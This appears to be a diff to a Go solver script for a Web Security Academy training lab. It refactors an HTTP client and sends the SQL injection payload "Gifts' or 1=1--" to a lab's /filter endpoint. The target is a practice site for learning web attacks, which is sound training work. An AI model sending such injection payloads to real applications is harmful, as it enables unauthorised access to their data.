@@ -19,19 +19,20 @@ func main() {
 }
 
 func solve() error {
-	jar, err := cookiejar.New(nil)
+	client, err := newClient()
 	if err != nil {
 		return err
 	}
 
-	client := &http.Client{Jar: jar}
-
-	domain := "https://0a06001b03526b04c07004ae00980099.web-security-academy.net"
-	resp, err := client.Get(domain + "/filter?category=" + url.QueryEscape("Gifts' or 1=1--"))
+	u := "https://0a80001304705c20c03b5460003a0055.web-security-academy.net"
+	resp, err := client.Get(u + "/filter?category=" + url.QueryEscape("Gifts' or 1=1--"))
 	if err != nil {
 		return err
 	}
 	defer resp.Body.Close()
+	if resp.StatusCode / 100 != 2 {
+		return fmt.Errorf("Status: %v", resp.Status)
+	}
 
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
@@ -41,3 +42,11 @@ func solve() error {
 	return err
 }
 
+func newClient() (*http.Client, error) {
+	jar, err := cookiejar.New(nil)
+	if err != nil {
+		return nil, err
+	}
+
+	return &http.Client{Jar: jar}, nil
+}
